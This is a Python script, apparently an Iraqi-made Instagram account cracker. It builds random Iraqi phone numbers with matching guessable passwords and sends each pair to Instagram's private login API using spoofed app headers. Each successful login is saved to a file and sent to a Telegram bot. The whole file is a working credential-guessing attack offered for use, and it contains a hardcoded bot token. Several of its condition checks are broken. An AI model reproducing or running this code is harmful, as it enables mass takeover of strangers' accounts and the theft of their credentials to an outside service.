#تغير حقوق = gay
#كلام بس للخماط
# لغة بايثون وتغير حقوق شتحسسس يفاشلللللللللللل
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os

import sys
import requests
os.system("clear")
B ='\033[1;92m'
A ='\033[1;91m'
import os,sys,subprocess
subprocess.getoutput("pip install requests")
import requests,sys,os,time
KaBOs = 'k'
pss=input("\033[1;37m [~]\033[1;35mENTER PASSWORD :\033[1;33m")
if pss ==KaBOs:
 pass
 print("\033[1;32m          SUCCESS PASSWORD ")
 time.sleep(1)
 os.system('clear')
else:
 exit('\033[1;31m             WORNG PASSWORD ')


try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'
bot = '1935527391:AAFX9h4-4a05PTP4CbYPCNi8uhg2oh3UQQIGB'  
print('_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
print("\n[?] HeRo v1 iraq love ")
h , b,s,block = 0,0,0,0
tele = input("[+]  To Telegram Y/N ?: ")
if "Y" in tele:
    id = input("[+] ID TELE : ")
    bot = input("[+] TOKEN BOT TELE : ")
elif "y" in tele:
    id = input("[+] ID TELE : ")
    bot = input("[+] TOKEN BOT TELE : ")
print("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
ask = input("""[1] 077
[2] 075
[3] 078
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[+] NETER 1 - 2 - 3 - : """)
if ask == "1":
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+96477' + us
        pasw = '077' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴇᴡ ᴀᴄᴄ\n====================\n[=] ᯓ ᴇᴍᴀɪʟ »   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @KKKKKGK - @H8PPP")
            open("Hits.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
#-------------------------------------------------------
if ask == "2":               
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+96475' + us
        pasw = '075' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴇᴡ ᴀᴄᴄ\n====================\n[=] ᯓ ᴇᴍᴀɪʟ »   : {user} \n[=] ᯓ ᴘᴀssᴡᴏʀᴅ »  : {pasw}\n====================\nBY : @KKKKKGK - @H8PPP")
            open("Hits.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

if ask == "3":               
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+96478' + us
        pasw = '078' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴇᴡ ᴀᴄᴄ\n====================\n[=] ᯓ ᴇᴍᴀɪʟ »   : {user} \n[=] ᯓ ᴘᴀssᴡᴏʀᴅ »  : {pasw}\n====================\nBY : @KKKKKGK - @H8PPP")
            open("Hits.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
